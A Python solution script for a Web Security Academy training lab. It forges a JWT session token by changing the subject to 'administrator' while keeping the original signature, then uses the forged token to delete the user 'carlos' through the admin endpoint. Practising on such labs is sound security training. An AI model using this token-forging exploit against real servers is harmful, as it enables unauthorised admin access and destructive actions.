#!/usr/bin/env python3
"""JWT authentication bypass via unverified signature"""

import os
import bs4
import base64
import json

import requests
import jwt


class Lab:
    """Wrapper"""

    def __init__(self) -> None:
        lab_id = os.environ["LAB_ID"]
        self.url = f"https://{lab_id}.web-security-academy.net"
        self.session = requests.Session()

    def get(self, path: str, params: dict | None = None) -> requests.models.Response:
        """Get path"""
        response = self.session.get(self.url + path, params=params)
        response.raise_for_status()
        return response

    def csrf_token(self, path: str) -> str:
        """Get CSRF token"""
        response = self.get(path)
        soup = bs4.BeautifulSoup(response.text, features="lxml")
        meta_token = soup.find("input",
                               attrs={"name": "csrf", "type": "hidden"})
        csrf_token = meta_token["value"]
        if csrf_token is None:
            raise ValueError("No CSRF token")
        return csrf_token

    def login(self, username: str, password: str,
              csrf: str | None = None) -> requests.models.Response:
        """Log in"""
        payload = {"username": username, "password": password}
        if csrf is not None:
            payload["csrf"] = csrf
        response = self.session.post(f"{self.url}/login", data=payload)
        response.raise_for_status()
        return response


def main() -> None:
    """Entry point"""
    site = Lab()
    csrf = site.csrf_token("/login")
    site.login(username="wiener", password="peter", csrf=csrf)
    token_name = "session"
    encoded_session = site.session.cookies[token_name]
    token = jwt.api_jwt.decode_complete(encoded_session,
                                        options={"verify_signature": False})

    token["payload"]["sub"] = "administrator"
    header = json.dumps(token["header"]).encode()
    payload = json.dumps(token["payload"]).encode()
    signature = token["signature"]
    forgery = ".".join(base64.urlsafe_b64encode(s).decode()
                        for s in [header, payload, signature])

    site.session.cookies.set(token_name, forgery)
    response = site.get("/admin/delete",
                        params={"username": "carlos"})
    print(response.status_code)


if __name__ == "__main__":
    main()
